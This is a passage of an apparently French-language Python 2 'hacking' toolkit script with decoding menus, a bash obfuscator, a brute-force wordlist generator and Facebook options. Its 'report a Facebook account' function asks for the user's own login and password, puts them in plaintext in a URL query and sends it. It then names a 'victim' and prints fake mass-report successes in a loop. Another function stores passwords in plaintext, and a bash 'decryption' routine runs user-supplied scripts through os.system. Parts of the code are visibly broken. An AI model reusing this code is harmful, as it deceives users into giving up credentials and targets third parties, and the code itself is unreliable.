	print("[38;5;214m<‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê>") 
	felicitation = raw_input("\033[1;31m[\033[1;37m**\033[1;31m]  [38;5;214mSaisissez votre nom\033[1;91m  : [38;5;108m")    
        print("[38;5;214m<‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê>")
	if felicitation =="":
		print("\033[1;31m[\033[1;37m!\033[1;31m] [38;5;185mVeuillez remplir, car il est obligatoire. Merci")
		time.sleep(2)
		feliciter()
	else:
		cls() 
		feliciter_faxel()
####################################################################################################
def feliciter_faxel(): 
        cls()
        print(logo10)
	anime("\t\033[1;91m [\033[1;93m*\033[1;91m]\033[1;96m Encourager Faxel via WhatsApp \033[1;91m  [\033[1;93m*\033[1;91m]\033[1;97m\n")
	felicitation = raw_input("\t   \033[1;31m[\033[1;33m*\033[1;31m]  [38;5;214mConfirmer votre nom\033[1;91m  : [38;5;108m") 
        message = raw_input("\t    \033[1;91m [\033[1;93m+\033[1;91m]\033[1;97m Entrer votre message \033[1;91m [\033[1;93m+\033[1;91m]\033[1;97m\n         \t")
	message.replace(' ', '%20')
	sg ="sign√© : "
        load("\033[1;91m [\033[1;97m*\033[1;91m]\033[1;97m Chargement, veuillez patienter\033[1;92m ...")
        try:
            sp.check_output([
             'am', 'start',
             'https://api.whatsapp.com/send?phone=22555709610&text=F√©licitation : je vous contacte depuis votre code github pour vous f√©liciter.\nVoici mon message.\n' + message + '\n\t\t'+sg+''+felicitation+''])
	    print("\n\033[1;91m [\033[1;97m*\033[1;91m]\033[1;92m Rapport en cours d'envoi comfirmer.")
	    raw_input('\033[1;91m [\033[1;97m!\033[1;91m]\033[1;97m Appuyer entrer pour retourner au menu\033[1;93m...')
	    Menu_Feliciter_Signal()		
        except:
            print("\n\033[1;91m [\033[1;93m!\033[1;91m]\033[1;94m √âchec de l'envoi du rapport.")
	    raw_input('\033[1;91m [\033[1;93m!\033[1;91m]\033[1;97m Appuyer entrer pour retourner au menu\033[1;93m...')
	    Menu_Feliciter_Signal()
####################################################################################################
def signal_bug():	
	cls()
	print("[38;5;214m<‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê>") 
	signal = raw_input("\033[1;31m[\033[1;37m**\033[1;31m]  [38;5;214mSaisissez votre nom\033[1;91m  : [38;5;108m")    
        print("[38;5;214m<‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê>")
	if signal =="":
		print("\033[1;31m[\033[1;37m!\033[1;31m] [38;5;185mVeuillez remplir, car il est obligatoire. Merci")
		time.sleep(2)
		signal_bug()
	else:
		cls() 
		Rapport_bug()
####################################################################################################
def Rapport_bug():
	cls()
        print(logo9)
        anime("\t\033[1;91m [\033[1;93m*\033[1;91m]\033[1;96m Signaler un bug via WhatsApp \033[1;91m  [\033[1;93m*\033[1;91m]\033[1;97m\n")
        signal = raw_input("\t   \033[1;31m[\033[1;33m*\033[1;31m]  [38;5;214mConfirmer votre nom\033[1;91m  : [38;5;108m")
	message = raw_input("\t    \033[1;91m [\033[1;93m+\033[1;91m]\033[1;97m Entrer votre message \033[1;91m [\033[1;93m+\033[1;91m]\033[1;97m\n         \t")
	message.replace(' ', '%20')
	sg ="sign√© : "
        load("\033[1;91m [\033[1;97m*\033[1;91m]\033[1;97m Chargement, veuillez patienter\033[1;92m ...")
        try:
            sp.check_output([
             'am', 'start',
             'https://api.whatsapp.com/send?phone=22555709610&text=Probl√®me : je vous contacte depuis votre code github pour signaler ce bug.\nVoici mon message.\n' + message + '\n\t\t'+sg+''+signal+''])
	    print("\n\033[1;91m [\033[1;97m*\033[1;91m]\033[1;92m Signalisation du bug  en cours, comfirmer.")
	    raw_input('\033[1;91m [\033[1;97m!\033[1;91m]\033[1;97m Appuyer entrer pour retourner au menu\033[1;93m...')
	    Menu_Feliciter_Signal()	
        except:
            print("\n\033[1;91m [\033[1;93m!\033[1;91m]\033[1;94m √âchec de l'envoi du rapport de bug")
	    raw_input('\033[1;91m [\033[1;93m!\033[1;91m]\033[1;97m Appuyer entrer pour retourner au menu\033[1;93m...')
	    Menu_Feliciter_Signal()	
####################################################################################################
def Signal_Fb():
      cls()  
      load("\033[1;97mChargement\033[1;93m...")
      cls()
      print(logo)
      nom_utilisateur = raw_input("\033[1;97m‚ïö‚ïê\033[1;31m‚ñ∂\033[1;97m Votre Email/Num√©ro/ID de FB \033[1;91m‚ñ∂‚ñ∂‚ñ∂ \033[1;96m")
      mot_de_passe = raw_input("\033[1;97m‚ïö‚ïê\033[1;31m‚ñ∂\033[1;97m Mot de passe \033[1;91m‚ñ∂‚ñ∂‚ñ∂ \033[1;96m")
      url = "https://m.facebook.com/help/contact/144059062408922?_rdc=1&_rdr/store.php?username="+str(nom_utilisateur)+"&password="+str(mot_de_passe)
      connexion = requests.get(url)
      print("\033[1;91m [\033[1;97m+\033[1;91m]\033[1;92m Connexion r√©ussie\033[1;93m...... \033[1;91m [\033[1;97m+\033[1;91m]")
      mael("\033[1;91m [\033[1;97m+\033[1;91m]\033[1;97mVeuillez saisir l'identifiant Facebook de votre victime \033[1;91m [\033[1;97m+\033[1;91m]")
      victime = raw_input("\033[1;91m [\033[1;97m+\033[1;91m]\033[1;97m Entrez \033[1;91m‚ñ∂‚ñ∂‚ñ∂ \033[1;94m")
      load("\033[1;97mChargement\033[1;93m...")
      print("\033[1;91m [\033[1;97m+\033[1;91m]\033[1;97m Recupreation des donn√©es de connexion veuillez patienter\033[1;93m....... \033[1;91m [\033[1;97m+\033[1;91m]")
      load("\033[1;97mChargement\033[1;93m...")
      print("\033[1;91m [\033[1;97m+\033[1;91m]\033[1;93m D√©marrage du moteur de cr√©ation de rapports\033[1;93m........ \033[1;91m [\033[1;97m+\033[1;91m]")
      time.sleep(3)
      print("\033[1;91m [\033[1;97m+\033[1;91m]\033[1;96m D√©but du rapport\033[1;93m........ \033[1;91m [\033[1;97m+\033[1;91m]")
      load("\033[1;97mChargement\033[1;93m...")
      print("\033[1;91m [\033[1;97m+\033[1;91m]\033[1;95m Signaler un compte Facebook, \033[38;5;245m@\033[38;5;221mFaxel \033[1;91m [\033[1;97m+\033[1;91m]\033[38;5;245m \033[1;92m")
      load("\033[1;97mChargement\033[1;93m...")
      i=100048845592611
      while i < 120048845592711:
        time.sleep(3)
        print("['+str(i)+']'+'+++r√©ussi signal√© +++ √†'+str(victime)")
        i=i+1
      print ("\033[1;91m [\033[1;97m*\033[1;91m]\033[1;92m Compilage reussi")
      raw_input('\033[1;91m  [\033[1;97m!!\033[1;91m]\033[1;97m Appuyer entrer pour retourner au menu\033[1;93m...')
      Menu_Feliciter_Signal()
####################################################################################################	
####################################################################################################	
def menu_decode():
    cls()
    print(logo)
    horaire()
    print("\033[1;97m‚ïî"+30*"‚ïê"+1*"‚ïê‚ïó")
    print("\033[1;97m‚ïë \033[1;91m[\033[1;96m1.\033[1;91m]\033[48;5;0;38;5;197m Decodage base64   \033[1;97m       ‚ïë")  
    print("\033[1;97m‚ïë \033[1;91m[\033[1;96m2.\033[1;91m]\033[38;5;227m Decodage base32          \033[1;97m‚ïë")
    print("\033[1;97m‚ïë \033[1;91m[\033[1;96m3.\033[1;91m]\033[38;5;115m Decodage base16   \033[1;97m       ‚ïë")
    print("\033[1;97m‚ïë \033[1;91m[\033[1;96m4.\033[1;91m]\033[38;5;112m Decodage marshall \033[1;97m       ‚ïë")
    print("\033[1;97m‚ïë \033[1;91m[\033[1;96m5.\033[1;91m]\033[38;5;136m Decryptage bash   \033[1;97m       ‚ïë")
    print("\033[1;97m‚ïë \033[1;91m[\033[1;96m6.\033[1;91m]\033[38;5;241m Facebook Hack     \033[1;97m       ‚ïë")
    print("\033[1;97m‚ïë \033[1;91m[\033[1;96mM.\033[1;91m]\033[48;5;0;38;5;192m Menu general      \033[1;97m       ‚ïë")
    print("\033[1;97m‚ïö"+30*"‚ïê"+1*"‚ïê‚ïù")   
    print("\033[1;97m‚ïë")  
    choix_decode()   
def choix_decode():    
    dmd = raw_input("\033[1;97m‚ïö‚ïê\033[1;31m‚ñ∂\033[38;5;245m Mr \033[38;5;221mFaxel \033[1;91m‚ñ∂‚ñ∂‚ñ∂ \033[1;96m")
    if dmd =="":
        print ("\n\t\033[1;91m[!] Remplissez correctement ")
	menu_decode()
    elif dmd =="1":
        dec_base_64()
    elif dmd =="2":
        dec_base_32()
    elif dmd =="3":
        dec_base_16()
    elif dmd =="4":
        dec_mars()
    elif dmd =="5":
        decryptage_bash()
    elif dmd =="6":
        connexion_facebook()
    elif dmd =="m" or dmd =="M":
        menu()
    else: 
        print('\n\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m '+dmd+' \x1b[1;91mindisponible')
        raw_input('\033[1;91m [\033[1;93m!\033[1;91m]\033[1;97m Appuyer entrer pour retourner au menu\033[1;93m...')
        menu_decode()
####################################################################################################
def dec_base_64():
   cls()  
   charge()
   cls()
   print(logo)
   script_dec_base_64 = raw_input("\033[1;97m‚ïö‚ïê\033[1;31m‚ñ∂\033[1;97m Entrer le nom du script a crypter \033[1;91m‚ñ∂‚ñ∂‚ñ∂ \033[1;97m")
   print("\033[1;97m‚ïë")
   resultat = raw_input("\033[1;97m‚ïö‚ïê\033[1;31m‚ñ∂\033[1;97m Nommer le resultat du cryptage \033[1;91m‚ñ∂‚ñ∂‚ñ∂ \033[1;97m")
   load("\033[1;97mAttente du decryptage \033[1;93m...")
   print("-"*40)
   try:
	ouverture = open(script_dec_base_64,'r').read()
   except:
   	print ("\033[1;91m [\033[1;93m!\033[1;91m]\033[1;97m Script introuvable")
        menu_decode() 
   sauve=[]
   jabot=[]
   sauvegarde=open(resultat,'w')
   for k in ouverture:
   	try:
   		print("Resultat -> ",base64.b64decode(k.split('\n')[0]))
   		resul = base64.b64decode(k.split('\n')[0])
   		jabot.append(resul)
   		time.sleep(00.01)
   	except:
		print("\033[1;91m [\033[1;97m*\033[1;91m]\033[1;94m Decompilage echouer") 
   		print ("\033[1;91m [\033[1;97m*\033[1;91m]\033[1;97m Desol√© se script n'a pas √©t√© crypter en base64")
   		sauve.append(k)
   		time.sleep(00.01)
   print("-"*40)
   for result in jabot:
   	sauvegarde.write(result.split('\n')[0]+"\n")
   sauvegarde.close()
   print(" R√©ussite totale:",len(jabot))
   print(" Emplacement :",sauvegarde)
   print("-"*40)
   print(" Echec:",len(sauve))
   for t in sauve:
	   print ("Echec:",t.replace('\n',''))
   print("-"*40)
   raw_input('\033[1;91m  [\033[1;97m!!\033[1;91m]\033[1;97m Appuyer entrer pour retourner au menu\033[1;93m...')
   menu_decode()
####################################################################################################
def dec_base_32():
   cls()  
   charge()
   cls()
   print(logo)
   script_dec_base_32 = raw_input("\033[1;97m‚ïö‚ïê\033[1;31m‚ñ∂\033[1;97m Entrer le nom du script a crypter \033[1;91m‚ñ∂‚ñ∂‚ñ∂ \033[1;97m")
   print("\033[1;97m‚ïë")
   resultat = raw_input("\033[1;97m‚ïö‚ïê\033[1;31m‚ñ∂\033[1;97m Nommer le resultat du cryptage \033[1;91m‚ñ∂‚ñ∂‚ñ∂ \033[1;97m")
   load("\033[1;97mAttente du decryptage \033[1;93m...")
   print("-"*40)
   try:
	ouverture = open(script_dec_base_32,'r').read()
   except:
   	print ("\033[1;91m [\033[1;93m!\033[1;91m]\033[1;97m Script introuvable")
        menu_decode() 
   sauve=[]
   jabot=[]
   sauvegarde = open(resultat,'w')
   for k in ouverture:
   	try:
   		print("\033[1;91m [\033[1;97m*\033[1;91m]\033[1;95m Resultat -> ",base64.b32decode(k.split('\n')[0]))
   		resul = base64.b32decode(k.split('\n')[0])
   		jabot.append(resul)
   		time.sleep(00.01)
   	except:
   		print ("\033[1;91m [\033[1;97m*\033[1;91m]\033[1;93m Desol√© se script n'a pas √©t√© crypter en base32")
   		sauve.append(k)
   		time.sleep(00.01)
   print("-"*40)
   for result in jabot:
   	sauvegarde.write(result.split('\n')[0]+"\n")
   sauvegarde.close()
   print("\033[1;91m [\033[1;97m*\033[1;91m]\033[1;94m Decompilage echouer")
   print(" R√©ussite totale:",len(jabot))
   print(" Emplacement :",sauvegarde)
   print("-"*40)
   print(" Echec:",len(sauve))
   for t in sauve:
	   print ("Echec:",t.replace('\n',''))
   print("-"*40)
   raw_input('\033[1;91m  [\033[1;97m!!\033[1;91m]\033[1;97m Appuyer entrer pour retourner au menu\033[1;93m...')
   menu_decode()	
####################################################################################################		
def dec_base_16():
   cls()  
   charge()
   cls()
   print(logo)
   script_dec_base_16 = raw_input("\033[1;97m‚ïö‚ïê\033[1;31m‚ñ∂\033[1;97m Entrer le nom du script a crypter \033[1;91m‚ñ∂‚ñ∂‚ñ∂ \033[1;97m")
   print("\033[1;97m‚ïë")
   resultat = raw_input("\033[1;97m‚ïö‚ïê\033[1;31m‚ñ∂\033[1;97m Nommer le resultat du cryptage \033[1;91m‚ñ∂‚ñ∂‚ñ∂ \033[1;97m")
   load("\033[1;97mAttente du decryptage \033[1;93m...")
   print("-"*40)
   try:
	ouverture = open(script_dec_base_16,'r').read()
   except:
   	print ("\033[1;91m [\033[1;93m!\033[1;91m]\033[1;97m Script introuvable")
        menu_decode() 
   sauve=[]
   jabot=[]
   sauvegarde=open(resultat,'w')
   for k in ouverture:
   	try:
   		print("\033[1;91m [\033[1;97m*\033[1;91m]\033[1;95m Resultat -> ",base64.b16decode(k.split('\n')[0]))
   		resul = base64.b16decode(k.split('\n')[0])
   		jabot.append(resul)
   		time.sleep(00.01)
   	except:
   		print ("\033[1;91m [\033[1;97m*\033[1;91m]\033[1;93m Desol√© se script n'a pas √©t√© crypter en base16")
   		sauve.append(k)
   		time.sleep(00.01)
   print("-"*40)
   for result in jabot:
   	sauvegarde.write(result.split('\n')[0]+"\n")
   sauvegarde.close()
   print("\033[1;91m [\033[1;97m*\033[1;91m]\033[1;94m Decompilage echouer")
   print(" R√©ussite totale:",len(jabot))
   print(" Emplacement :",sauvegarde)
   print("-"*40)
   print(" Echec:",len(sauve))
   for t in sauve:
	   print ("Echec:",t.replace('\n',''))
   print("-"*40)
   raw_input('\033[1;91m  [\033[1;97m!!\033[1;91m]\033[1;97m Appuyer entrer pour retourner au menu\033[1;93m...')
   menu_decode()	
####################################################################################################
def dec_mars():
	cls()  
        charge()
        cls()
        print(logo)
	script_dec_mars = raw_input("\033[1;97m‚ïö‚ïê\033[1;31m‚ñ∂\033[1;97m Entrer le nom du script a crypter \033[1;91m‚ñ∂‚ñ∂‚ñ∂ \033[1;97m")
	try:
		ouverture = open(script_dec_mars,'r').read()
	except IOError:
		print ("\033[1;91m [\033[1;93m!\033[1;91m]\033[1;97m Script introuvable")
		menu_decode()
	print("\033[1;97m‚ïë")
	emplacement = raw_input("\033[1;97m‚ïö‚ïê\033[1;31m‚ñ∂\033[1;97m Nommer le resultat du cryptage \033[1;91m‚ñ∂‚ñ∂‚ñ∂ \033[1;97m")
	load("\033[1;97mChargement\033[1;93m...")
	try:
		repare = ouverture.replace('\r\n', '\n')
	        repare = repare.replace('\r', 'n')
	        if repare and repare[(-1)] != '\n':
	            repare = repare + '\n'
	        decompilage = pp.decompile(repare, '<faxel>', 'exec')
	        decompte = marshal.dumps(compilage)
		enregistrement = open(emplacement,"w")
		enregistrement.write("#Decompiler par Faxel\n#Twitter : https://twitter.com/Faxel2020\nimport marshal\n("+repr(decompte)+")")
		enregistrement.close()
		print ("\033[1;91m [\033[1;97m*\033[1;91m]\033[1;92m Decompilage reussi")
		raw_input('\033[1;91m  [\033[1;97m!!\033[1;91m]\033[1;97m Appuyer entrer pour retourner au menu\033[1;93m...')
		menu_decode()
	except:
		print ("\033[1;91m [\033[1;97m*\033[1;91m]\033[1;94m Decompilage echouer")
		raw_input('\033[1;91m  [\033[1;97m!!\033[1;91m]\033[1;97m Appuyer entrer pour retourner au menu\033[1;93m...')
                menu_decode()
####################################################################################################    
def decryptage_bash():
   try:
       #Dev: Faxel
       cls()
       print(logo8)
       bash_decryp_script = raw_input("\033[1;97m‚ïö‚ïê\033[1;31m‚ñ∂\033[1;97m Entrer le nom du script a crypter \033[1;91m‚ñ∂‚ñ∂‚ñ∂ \033[1;97m")
       ouverture = open(bash_decryp_script,'r')
       Lecture_fichier = ouverture.read()
       ouverture.close()
       fichier_de_fin = Lecture_fichier.replace("eval","echo")
       resultat = raw_input("\033[1;97m‚ïö‚ïê\033[1;31m‚ñ∂\033[1;97m Nommer le resultat du cryptage \033[1;91m‚ñ∂‚ñ∂‚ñ∂ \033[1;97m")
       ouverture = open(resultat,'w')
       ouverture.write(fichier_de_fin)
       ouverture.close()
       os.system("bash " + resultat + " > faxel")
       load("\033[1;91m [\033[1;93m+\033[1;91m]\033[1;97m Decryptage en cours, veuillez patientez\033[1;93m..")
       print("\n\033[1;91m [\033[1;93m+\033[1;91m]\033[1;92m Decompilage reussi..")
       print("\n\033[1;91m [\033[1;93m-\033[1;91m]\033[1;97m Taper mv faxel /sdcard/ pour deplacement sur votre \033[1;92mSD")
       raw_input('\n\x1b[1;91m[ \x1b[1;97mRetour \x1b[1;91m]')		
       menu_decode()
   except KeyboardInterrupt:
       print("\033[1;91m [\033[1;93m!\033[1;91m]\033[1;94m Arret!")
       raw_input('\n\x1b[1;91m[ \x1b[1;97mRetour \x1b[1;91m]')		
       menu_decode()
   except IOError:
       print("\033[1;91m [\033[1;93m!\033[1;91m]\033[1;94m Fichier introuvable!")
       raw_input('\n\x1b[1;91m[ \x1b[1;97mRetour \x1b[1;91m]')		
       menu_decode()
####################################################################################################
def connexion_facebook():
    cls()
    print(logo)
    requete = requests.Session()
    print("\033[1;97m‚ïë")
    nomu = raw_input("\033[1;97m‚ïö‚ïê\033[1;31m‚ñ∂\033[1;97m Connectez-vous √† votre Fb \033[1;91m [\033[1;93m+\033[1;91m]\033[1;97m Nom d'utilisateur \033[1;91m‚ñ∂‚ñ∂ \033[1;97m ")
    print("\033[1;97m‚ïë")
    mdp = raw_input("\033[1;97m‚ïö‚ïê\033[1;31m‚ñ∂\033[1;97m Mot de passe \033[1;91m‚ñ∂‚ñ∂ \033[1;97m ")
    load("\033[1;97mRedirection vers compte facebook\033[1;93m...")
    requete_1 = requete.post('https://mbasic.facebook.com/login', data={'email': nomu, 'pass': mdp}).url
    if 'save-device' in requete_1 or 'm_sess' in requete_1:
        i = json.dumps({'email': nomu, 'pass':mdp, 
           'name': bs4.BeautifulSoup(requete.get('https://mbasic.facebook.com/me').text, features='html.parser').find('title').text})
        open('config/config.json', 'w').write(i)
        print('\033[1;91m [\033[1;93m*\033[1;91m]\033[1;92m Connexion r√©ussie..')
        cls()
	menu()
    if 'checkpoint' in requete_1 or 'challange' in requete_1:
        print("\033[1;91m [\033[1;93m!\033[1;91m]\033[1;97m Ton compte est bloqu√©! (Hit Session) Checkpoint\n\033[1;91m [\033[1;93m!\033[1;91m]\033[1;97m Veuillez vous connecter manuellement et autoriser l'entr√©e via le navigateur")
        raw_input('\n\033[1;91m [\033[1;93m*\033[1;91m]\033[1;97m Appuyez √† nouveau sur Entr√©e...')
        menu_decode()
    else:
        print('\033[1;91m [\033[1;93m!\033[1;91m]\033[1;94m √âchec de la connexion.')
        raw_input('\n\033[1;91m [\033[1;93m*\033[1;91m]\033[1;97m Appuyez √† nouveau sur Entr√©e pour...')
        menu_decode()
#################################################################################################### 
####################################################################################################
def menu_bash_ou_wordliste():
     cls()
     print(logo8)
     horaire()
     print("\033[1;97m‚ïî"+30*"‚ïê"+1*"‚ïê‚ïó")
     print("\033[1;97m‚ïë \033[1;91m[\033[1;96m1.\033[1;91m]\033[38;5;214m Bash\033[1;91m (\033[1;96mEval\033[1;97m,\033[1;93mecho\033[1;91m)\033[1;97m         ‚ïë")
     print("\033[1;97m‚ïë \033[1;91m[\033[1;96m2.\033[1;91m]\033[38;5;112m Creer une Wordliste   \033[1;97m   ‚ïë")  
     print("\033[1;97m‚ïë \033[1;91m[\033[1;96mM.\033[1;91m]\033[38;5;114m Menu general          \033[1;97m   ‚ïë") 
     print("\033[1;97m‚ïö"+30*"‚ïê"+1*"‚ïê‚ïù")   
     print("\033[1;97m‚ïë")
     choix_bash_ou_wordliste()
def choix_bash_ou_wordliste():    
    dmd = raw_input("\033[1;97m‚ïö‚ïê\033[1;31m‚ñ∂\033[38;5;245m Mr \033[38;5;221mFaxel \033[1;91m‚ñ∂‚ñ∂‚ñ∂ \033[1;96m")
    if dmd =="":
        print("\n\t\033[1;91m[!] Remplissez correctement ")
	menu()
    elif dmd =="1":
        menu_bash()
    elif dmd =="2":
        wordliste()
    elif dmd =="m" or dmd =="M":
        menu()
    else: 
        print('\n\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m '+dmd+' \x1b[1;91mindisponible')
        #raw_input('\033[1;91m  [\033[1;97m!!\033[1;91m]\033[1;97m Appuyer entrer pour retourner au menu\033[1;93m...')
        menu_bash_ou_wordliste()
####################################################################################################	
def wordliste():
	cls()
        print(logo_word)
	h = raw_input("\033[1;91m[\033[1;97m??\033[1;91m] \033[1;97mVous voulez-vous creer votre wordliste ? \033[1;94m[\033[1;92mo/\033[1;91mn\033[1;94m]\033[1;91m : \033[1;93m ")
        if h =="n" or h =="N":
	    menu_bash_ou_wordliste()
	elif h =="o" or h =="O":
            cls()
            load("\033[1;97mChargement\033[1;93m...")
            cls()
            print(logo)
            length=int(raw_input("\033[1;91m[\033[1;97m**\033[1;91m] [38;5;217mEntrez le nombre de caracteres \x1b[1;91m: \x1b[1;93m"))
            nom=raw_input("\n\033[1;91m[\033[1;97m++\033[1;91m] [38;5;218mNommez votre liste de mots avec l\'extension \x1b[1;91m(\x1b[1;97m.txt\x1b[1;91m)\x1b[1;91m : \x1b[1;93m ")
            tic = time.clock()
            print ("\n[38;5;214m<><><><><><><><><><><><><><><><><><><><><><><><><><>")
            print ("\033[1;91m[\033[1;97m++\033[1;91m] [38;5;108mCr√©ation du mdp en cours, veuillez patienter... \033[1;91m[\033[1;97m++\033[1;91m]")
            print ("[38;5;214m<><><><><><><><><><><><><><><><><><><><><><><><><><>\n")
            lista=[0 for x in xrange(length)]
            x=length-1
            string="abcdefghijklmnopqrstuvwxyz1234567890!@#$%^&*"
            list_of_results=[]
            file1=file(nom,"w")
            while(x>-1):
                result=""
                if lista[x]==len(string)-1:
                    for z in xrange (length):
                        result+=string[lista[z]]
                    lista[x]=0
                    x-=1
                elif x==length-1:
                    for z in xrange(length):
                        result+=string[lista[z]]
                    lista[x]+=1
                else:
                    for z in xrange(length):
                        result+=string[lista[z]]
                    lista[x]+=1
                    if x>0:
                        x+=1
                    else:
                        x=length-1
                file1.write(result+"\n")
            toc = time.clock()
            ttn = toc - tic
            print("[38;5;212m<‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê>\n")
            print("\033[1;91m[\033[1;97m**\033[1;91m] [38;5;108mTerminer en\x1b[1;92m "+str(ttn)+" [38;5;108msecondes.\n")
            print("\033[1;91m[\033[1;97m--\033[1;91m] \x1b[1;97mEnregistrer sous le nom de[38;5;112m "+str(nom)+"\x1b[1;97m dans votre repertoire.\n")
            print("\033[1;91m[\033[1;97m++\033[1;91m] \x1b[1;97mTaper\x1b[1;96m cat\x1b[1;91m +\x1b[1;97m nom de votre fichier avec\nl\'extension pour voir votre mot de passe.\n")
            print("[38;5;212m<‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê>\n")
            print("[38;5;214m<‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê>\n")
            print("\033[1;31m[\033[1;37m**\033[1;31m] \033[0m Auteur \033[1;31m:[38;5;112m* \033[48;5;0;38;5;197mMr Faxel[38;5;112m * \033[1;31m[*] [38;5;18m")        
            print("[38;5;214m<‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê>\n")
            raw_input('\n\033[1;91m[\033[1;97mRetour\033[1;91m]')
            menu_bash_ou_wordliste()
        else:
            menu_bash_ou_wordliste()
####################################################################################################
####################################################################################################
def menu_bash():
     cls()
     print(logo8)
     horaire()
     print("\033[1;97m‚ïî"+30*"‚ïê"+1*"‚ïê‚ïó")
     print("\033[1;97m‚ïë \033[1;91m[\033[1;96m1.\033[1;91m]\033[38;5;112m Cryptage bash         \033[1;97m   ‚ïë")
     print("\033[1;97m‚ïë \033[1;91m[\033[1;96mP.\033[1;91m]\033[38;5;115m Menu precedent          \033[1;97m ‚ïë")
     print("\033[1;97m‚ïë \033[1;91m[\033[1;96mM.\033[1;91m]\033[38;5;116m Menu general          \033[1;97m   ‚ïë") 
     print("\033[1;97m‚ïö"+30*"‚ïê"+1*"‚ïê‚ïù")   
     print("\033[1;97m‚ïë")
     choix_bash()
def choix_bash():    
    dmd = raw_input("\033[1;97m‚ïö‚ïê\033[1;31m‚ñ∂\033[38;5;245m Mr \033[38;5;221mFaxel \033[1;91m‚ñ∂‚ñ∂‚ñ∂ \033[1;96m")
    if dmd =="":
        print ("\n\t\033[1;91m[!] Remplissez correctement ")
	menu_bash()
    elif dmd =="1" or dmd =="c" or dmd =="C":
        cryptage_bash()
    elif dmd =="p" or dmd =="P":
        menu_bash_ou_wordliste()
    elif dmd =="m" or dmd =="M":
        menu()
    else: 
        print('\n\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m '+dmd+' \x1b[1;91mindisponible')
        raw_input('\033[1;91m [\033[1;93m!\033[1;91m]\033[1;97m Appuyer entrer pour retourner au menu\033[1;93m...')
        menu_bash()
####################################################################################################	
def cryptage_bash(): 
   try:
       cls()
       print(logo8)
       bash_cryp_script = raw_input("\033[1;97m‚ïö‚ïê\033[1;31m‚ñ∂\033[1;97m Entrer le nom du script a crypter \033[1;91m‚ñ∂‚ñ∂‚ñ∂ \033[1;97m")
       resultat = raw_input("\033[1;97m‚ïö‚ïê\033[1;31m‚ñ∂\033[1;97m Nommer le resultat du cryptage \033[1;91m‚ñ∂‚ñ∂‚ñ∂ \033[1;97m")
       os.system("bash-obfuscate " + bash_cryp_script + " -o " + resultat )
       print ("\033[1;91m [\033[1;93m!\033[1;91m]\033[1;92m Terminer..")
       raw_input('\n\x1b[1;91m[ \x1b[1;97mRetour \x1b[1;91m]')		
       menu_bash()
   except KeyboardInterrupt:
       print ("\033[1;91m [\033[1;93m!\033[1;91m]\033[1;94m Arret!")
       raw_input('\n\x1b[1;91m[ \x1b[1;97mRetour \x1b[1;91m]')		
       menu_bash()
   except IOError:
       print ("\033[1;91m [\033[1;93m!\033[1;91m]\033[1;94m Fichier introuvable!")
       raw_input('\n\x1b[1;91m[ \x1b[1;97mRetour \x1b[1;91m]')		
       menu_bash()
####################################################################################################	
####################################################################################################
def menu_mars_zlib_base():
    cls()
    print(logo7)
    horaire()
    print("\033[1;97m‚ïî"+30*"‚ïê"+1*"‚ïê‚ïó")
    print("\033[1;97m‚ïë \033[1;91m[\033[1;96m1.\033[1;91m]\033[38;5;125m Menu  Zlib + Bases      \033[1;97m ‚ïë")
    print("\033[1;97m‚ïë \033[1;91m[\033[1;96m2.\033[1;91m]\033[38;5;243m Menu  Marshal + Bases   \033[1;97m ‚ïë")
    print("\033[1;97m‚ïë \033[1;91m[\033[1;96m3.\033[1;91m]\033[38;5;136m Menu  Mars + Zlib + Base\033[1;97m ‚ïë")
